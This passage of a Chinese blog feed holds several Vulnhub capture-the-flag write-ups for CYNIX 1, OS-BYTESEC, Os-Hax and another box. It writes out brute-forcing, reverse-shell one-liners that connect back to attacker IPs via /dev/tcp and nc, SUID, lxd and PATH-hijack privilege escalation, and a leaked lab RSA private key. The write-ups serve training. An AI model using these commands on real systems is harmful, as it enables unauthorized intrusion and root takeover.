<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0&#x2F;24</span><br><span class="line">nmap -sn 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure></div>

<p>2、扫目标端口开发情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -p- -T5 192.168.56.102 #全端口扫描</span><br><span class="line">nmap -sV -sC -p 22,25,80,110 -A  192.168.56.102 -o h-3</span><br><span class="line">nmap -p- -A 192.168.56.102 -T5 -oA h-3</span><br></pre></td></tr></table></figure></div>

<p>3、访问主页，根据提示说有一个password_resets，我们扫一下目录情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.56.102&#x2F;websec -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -t 100 --wildcard | grep -v 4647</span><br><span class="line"></span><br><span class="line">dirb http:&#x2F;&#x2F;192.168.1.102&#x2F;</span><br><span class="line"></span><br><span class="line">dirsearch -u 192.168.136.150 -e*  -x 403</span><br></pre></td></tr></table></figure></div>

<p>4、爬取页面的关键词，页面也收集到邮箱<a href="mailto:contact@hacknos.com">contact@hacknos.com</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;192.168.56.102&#x2F;websec&#x2F; &gt; cewl.txt</span><br></pre></td></tr></table></figure></div>

<p>5、接着用hydra爆破页面</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hydra -l contact@hacknos.com -P cewl.txt  192.168.56.102 http-post-form &quot;&#x2F;websec&#x2F;admin:username&#x3D;^USER^&amp;password&#x3D;^PASS^:Wrong email&quot; -V</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923212338360.png" alt="image-20210923212338360"></p>
</blockquote>
<p>6、进入管理员后台，经典的theme改header.php来直接命令执行和反弹shell</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923212634589.png" alt="image-20210923212634589"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">bash -c &#39;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.56.1&#x2F;1234 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure></div>

<p>5、利用suid提权</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;cpulimit</span><br></pre></td></tr></table></figure></div>

<p>6、用c语言写个root权限执行bin/sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc,char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">	setreuid(0,0);</span><br><span class="line">	execve(&quot;&#x2F;bin&#x2F;bash&quot;,NULL,NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923220037602.png" alt="image-20210923220037602"></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923220134498.png" alt="image-20210923220134498"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【Vulnhub】靶机CYNIX1</title>
    <url>/posts/148.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Vulnhub刷题简单记录</li>
</ul>
</blockquote>
<h2 id="CYNIX-1"><a href="#CYNIX-1" class="headerlink" title="CYNIX 1"></a>CYNIX 1</h2><blockquote>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><ul>
<li>级别：中-难</li>
<li>用户标志：user.txt</li>
<li>根标志：root.txt</li>
<li>描述：这是一个 Boot2Root 机器。该机器与 VirtualBox 兼容，但也可以在 VMWare 中使用（未测试但应该可以使用）。DHCP 将自动分配 IP。您必须找到并读取分别存在于 user.txt 和 root.txt 中的两个标志（user 和 root）。尽情享受吧！</li>
</ul>
<p><a href="https://www.vulnhub.com/entry/cynix-1,394/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/cynix-1,394/</a></p>
</blockquote>
<h2 id="CYNIX-1-1"><a href="#CYNIX-1-1" class="headerlink" title="CYNIX 1"></a>CYNIX 1</h2><p>1、可以用两种方法确认靶场的存在，扫ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0&#x2F;24</span><br><span class="line">nmap -sn 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure></div>

<p>2、扫目标端口开发情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -p- -T5 192.168.56.101 #全端口扫描</span><br><span class="line">nmap -sV -sC -p 25,80,110,6688 -A  192.168.56.101 -o CyNix1</span><br></pre></td></tr></table></figure></div>

<p>3、访问主页，根据提示说有一个password_resets，我们扫一下目录情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.56.101&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -t 10</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">dirb http:&#x2F;&#x2F;192.168.1.104&#x2F;</span><br><span class="line"></span><br><span class="line">dirsearch -u 192.168.136.150 -e*  -x 403</span><br></pre></td></tr></table></figure></div>

<p>4、通过找到文件包含漏洞获取私钥，就可以直接登录了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923160739207.png" alt="image-20210923160739207"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEogIBAAKCAQEAk1VUtcYuZmM1Zmm4yNpguzzeocGpMVYC540yT90QqaD2Bsal</span><br><span class="line">zYqvHKEh++bOL6QTSr0NjU9ifT&#x2F;lBIVSIA0TpjUTkpdIW045H+NlgMhN0q&#x2F;x6Yy2</span><br><span class="line">LofuB4LQqRzr6cP0paoOYNq1KYG3QF1ouGa4k1i0td4DepBxcu4JBMOm20E7BurG</span><br><span class="line">zo41f&#x2F;YWjC5DurNjIchzl4GyBClMGSXWbIbr6sYwVx2OKyiPLFLYusrNqwJNQvxz</span><br><span class="line">Mf5yolEYI8WOXJzCfiPQ5VG8KXBH3FHu+DhFNgrJQjgowD15ZMQ1qpO&#x2F;2FMhewR6</span><br><span class="line">gcDs7rCLUUXc9&#x2F;7uJ7e3zHlUyDgxakYohn3YiQIDAQABAoIBAE&#x2F;cfSJa3mPZeuSc</span><br><span class="line">gfE9jhlwES2VD+USPljNDGyF47ZO7Y0WuGEFv43BOe6VWUYxpdNpTqM+WKCTtcwR</span><br><span class="line">iEafT&#x2F;tT4dwf7LSxXf2PAUIhUS3W+UYjY80tGTUxD3Hbn3UDJuV1nH2bj3+ENJTL</span><br><span class="line">DSyHYZ1dA&#x2F;dg9HnHOfeWV4UhmJxXmOAOKgU9Z73sPn4bYy4B3jnyqWn392MsQftr</span><br><span class="line">69ZYauTjku9awpuR5MAXMJ9bApk9Q7LZYwwGaSZw8ceMEUj7hkZBtP9W9cilCOdl</span><br><span class="line">rFXnkc8CvUpLh+hX6E&#x2F;JOCGsUvdPuVLWKd2bgdK099GrRaenS8SlN0AUTfyNiqg4</span><br><span class="line">VE7V8AECgYEAwoGVE+Z8Tn+VD5tzQ0twK+cP2TSETkiTduYxU3rLqF8uUAc3Ye&#x2F;9</span><br><span class="line">TLyfyIEvU7e+hoKltdNXHZbtGrfjVbz6gGuGehIgckHPsZCAQLPwwEqp0Jzz9eSw</span><br><span class="line">qXI0uM7n2vSdEWfCAcJBc559JKZ5uwd0XwTPNhiUqe6DUDUOZ7kI34ECgYEAwenM</span><br><span class="line">gMEaFOzr&#x2F;gQsmBNyDj2gR2SuOYnOWfjUO3DDleP7yXYNTcRuy6ke1kvMhf9fWw7h</span><br><span class="line">dq3ieU0KSHrNUQ9igFK5C8FvsB+HUyEjfVpNhFppNpWUUWKDRCypbmypLg0r+9I7</span><br><span class="line">myrdBFoYv30WKVsEHus1ye4nJzKjCtkgmjYMfQkCgYA0hctcyVNt2xPEWCTC2j8b</span><br><span class="line">C9UCwSStAvoXFEfjk&#x2F;gkqjcWUyyIXMbYjuLSwNen0qk3J1ZaCAyxJ8009s0DnPlD</span><br><span class="line">7kUs93IdiFnuR+fqEO0E7+R1ObzC&#x2F;JMb3oQQF4cSYBV92rfPw8Xq07RVTkL21yd8</span><br><span class="line">dQ8DO5YBYS&#x2F;CW+Fc7uFPgQKBgHWAVosud792UQn7PYppPhOjBBw+xdPXzVJ3lSLv</span><br><span class="line">kZSiMVBCWI1nGjwOnsD77VLFC+MBgV2IwFMAe9qvjvoveGCJv9d&#x2F;v03ZzQZybi7n</span><br><span class="line">KVGp91c8DEPEjgYhigl&#x2F;joR5Ns3A9p1vu72HWret9F&#x2F;a5wRVQqK5zL&#x2F;Tzzgjmb3Y</span><br><span class="line">QnkBAoGAVosEGOE7GzBMefGHjQGMNKfumeJ01+Av6siAI6gmXWAYBaU618XhFEh1</span><br><span class="line">+QNoLgWvSXoBuN+pMkxnRCfMTNbD1wSk46tW3sWHkZdV31gKceOifNzMVw53bJHP</span><br><span class="line">&#x2F;kto0eGJ&#x2F;vgM0g9eyqmcpPTVqf7EwkJdo0LngOprNyTk+54ZiUg&#x3D;</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923161703269.png" alt="image-20210923161703269"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa ford@192.168.56.101 -p 6688</span><br></pre></td></tr></table></figure></div>

<p>5、利用lxd提权</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">git clone  https:&#x2F;&#x2F;github.com&#x2F;saghul&#x2F;lxd-alpine-builder.git</span><br><span class="line">sudo .&#x2F;build-alpine</span><br><span class="line">python2 -m SimpleHTTPServer</span><br><span class="line">wget http:&#x2F;&#x2F;192.168.56.1:8080&#x2F;alpine-v3.14-x86_64-20210923_0451.tar.gz #传入目标机</span><br></pre></td></tr></table></figure></div>

<p>6、用lxc提权</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">lxc image import .&#x2F;alpine-v3.14-x86_64-20210923_0451.tar.gz --alias mygylq # 别名为mygylq</span><br><span class="line"></span><br><span class="line">lxc image list #查看</span><br><span class="line"></span><br><span class="line">lxc init mygylq mygylq -c security.privileged&#x3D;true #初始化镜像</span><br><span class="line"></span><br><span class="line">lxc config device add mygylq mygylq disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true #加载容器</span><br><span class="line"></span><br><span class="line">lxc start mygylq #启动</span><br><span class="line">lxc exec mygylq &#x2F;bin&#x2F;sh #进入root的sh</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923171534155.png" alt="image-20210923171534155"></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923171914279.png" alt="image-20210923171914279"></p>
</blockquote>
<p>总结</p>
<blockquote>
<p>就是将整个机子里面的目录，在复制进我们创建的容器中，就可以看到root的用户的文件了。</p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【Vulnhub】靶机OS-BYTESEC</title>
    <url>/posts/147.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Vulnhub刷题简单记录</li>
</ul>
</blockquote>
<h2 id="OS-BYTESEC"><a href="#OS-BYTESEC" class="headerlink" title="OS-BYTESEC"></a>OS-BYTESEC</h2><blockquote>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>难度：中级</p>
<p>标志：引导根</p>
<p>学习：利用 | 网络应用安全| 权限提升</p>
<p><a href="https://www.vulnhub.com/entry/hacknos-os-hax,389/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/hacknos-os-hax,389/</a></p>
</blockquote>
<h2 id="OS-BYTESEC-1"><a href="#OS-BYTESEC-1" class="headerlink" title="OS-BYTESEC"></a>OS-BYTESEC</h2><p>1、可以用两种方法确认靶场的存在，扫ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0&#x2F;24</span><br><span class="line">nmap -sn 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure></div>

<p>2、扫目标端口开发情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -A 192.168.136.150 -o os-ByteSec</span><br></pre></td></tr></table></figure></div>

<p>3、访问主页，根据提示说有一个password_resets，我们扫一下目录情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.136.150&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -t 2</span><br><span class="line">00</span><br><span class="line"></span><br><span class="line">dirb http:&#x2F;&#x2F;192.168.1.104&#x2F;</span><br><span class="line"></span><br><span class="line">dirsearch -u 192.168.136.150 -e*  -x 403</span><br></pre></td></tr></table></figure></div>

<p>4、通过smbmap查看共享文件，也可以用 enum4linux来全方面枚举信息</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">smbmap -H 192.168.136.150</span><br><span class="line">enum4linux 192.168.136.150</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923113852814.png" alt="image-20210923113852814"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">S-1-22-1-1000 Unix User\sagar (Local User)</span><br><span class="line">S-1-22-1-1001 Unix User\blackjax (Local User)</span><br><span class="line">S-1-22-1-1002 Unix User\smb (Local User)</span><br></pre></td></tr></table></figure></div>

<p>5、根据主页的提示smb无密码，所以直接用smbclient登陆</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923120739291.png" alt="image-20210923120739291"></p>
</blockquote>
<p>6、接着获取其中的文件</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923121050981.png" alt="image-20210923121050981"></p>
</blockquote>
<p>7、破解zip密码hacker1</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">fcrackzip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u safe.zip</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923121831075.png" alt="image-20210923121831075"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">xdg-open secret.jpg</span><br></pre></td></tr></table></figure></div>

<p>7、破解包，发现了blackjax的密码为snowflake</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt user.cap</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923122502664.png" alt="image-20210923122502664"></p>
</blockquote>
<p>接着ssh登陆，一开始扫出的ssh端口为2525</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923122933073.png" alt="image-20210923122933073"></p>
</blockquote>
<p>7、看看能不能suid提权</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">xxd &#x2F;usr&#x2F;bin&#x2F;netscan | less #查看发现其调用netstat -antp 命令</span><br></pre></td></tr></table></figure></div>

<p>8、利用环境命令的劫持，来让我们提升到root权限</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">blackjax@nitin:/tmp$ echo "/bin/sh" &gt; netstat</span><br><span class="line"></span><br><span class="line">blackjax@nitin:/tmp$ chmod 777 netstat</span><br><span class="line"></span><br><span class="line">blackjax@nitin:/tmp$ ls</span><br><span class="line">netstat  systemd-private-bb2ad2734f824feba859caafc338a835-systemd-timesyncd.service-4xDQxg  vmware-root</span><br><span class="line"></span><br><span class="line">blackjax@nitin:/tmp$ echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line"></span><br><span class="line">blackjax@nitin:/tmp$ export PATH=/tmp:$PATH</span><br><span class="line"></span><br><span class="line">blackjax@nitin:/tmp$ echo $PATH</span><br><span class="line">/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line"></span><br><span class="line">blackjax@nitin:/tmp$ netscan</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923124344076.png" alt="image-20210923124344076"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【Vulnhub】靶机Os-Hax</title>
    <url>/posts/146.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Vulnhub刷题简单记录</li>
</ul>
</blockquote>
<h2 id="OS-HAX"><a href="#OS-HAX" class="headerlink" title="OS-HAX"></a>OS-HAX</h2><blockquote>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>难度：中级</p>
<p>标志：引导根</p>
<p>学习：利用 | 网络应用安全| 权限提升</p>
<p><a href="https://www.vulnhub.com/entry/hacknos-os-hax,389/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/hacknos-os-hax,389/</a></p>
</blockquote>
<h2 id="OS-HAX开始"><a href="#OS-HAX开始" class="headerlink" title="OS-HAX开始"></a>OS-HAX开始</h2><p>1、可以用两种方法确认靶场的存在，扫ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0&#x2F;24</span><br><span class="line">nmap -sn 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure></div>

<p>2、扫目标端口开发情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -A 192.168.1.108</span><br></pre></td></tr></table></figure></div>

<p>3、访问主页，根据提示说有一个password_resets，我们扫一下目录情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.104&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-small.txt -t 200</span><br><span class="line"></span><br><span class="line">dirb http:&#x2F;&#x2F;192.168.1.104&#x2F;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="C:%5CUsers%5C23242%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210923095447795.png" alt=""></p>
</blockquote>
<p>4、通过String查看img中的flaghost的图片，获取一个密码的信息passw@45</p>
<blockquote>
<p><img src="C:%5CUsers%5C23242%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210923095551878.png" alt=""></p>
</blockquote>
<p>5、也可以用exiftool 来查看图片信息</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923100008814.png" alt=""></p>
</blockquote>
<p>6、接着猜测他是目录，发现了brainfuck加密，接着去解密<a href="http://192.168.1.102/passw@45/flag2.txt" target="_blank" rel="noopener">http://192.168.1.102/passw@45/flag2.txt</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">i+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +++++ +++++ +++++ .&lt;+++ +[-&gt;- ---&lt;]</span><br><span class="line">&gt;--.- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- -.&lt;++ +[-&gt;+ ++&lt;]&gt; +++++ .&lt;+++ ++[-&gt;</span><br><span class="line">+++++ &lt;]&gt;.+ +.+++ +++++ .---- --.&lt;+ ++[-&gt; +++&lt;] &gt;++++ .&lt;+++ ++++[ -&gt;---</span><br><span class="line">----&lt; ]&gt;-.&lt; +++[- &gt;---&lt; ]&gt;--- .+.-- --.++ +.&lt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923101446982.png" alt="image-20210923101446982"></p>
</blockquote>
<p>7、利用获取的账号和密码登陆wordpress后台改模板拿shell</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923101819727.png" alt="image-20210923101819727"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923102028521.png" alt="image-20210923102028521"></p>
</blockquote>
<p>7、用下面命令反弹shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.1.104 1234 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923105501616.png" alt="image-20210923105501616"></p>
</blockquote>
<p>8、提权看下面截图，就是利用web的权限，执行awk命令来获取root权限</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210923110221578.png" alt="image-20210923110221578"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【Vulnhub】靶机TROLLCAVE</title>
    <url>/posts/151.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Vulnhub刷题简单记录</li>
</ul>
</blockquote>
<h2 id="TROLLCAVE"><a href="#TROLLCAVE" class="headerlink" title="TROLLCAVE"></a>TROLLCAVE</h2><blockquote>
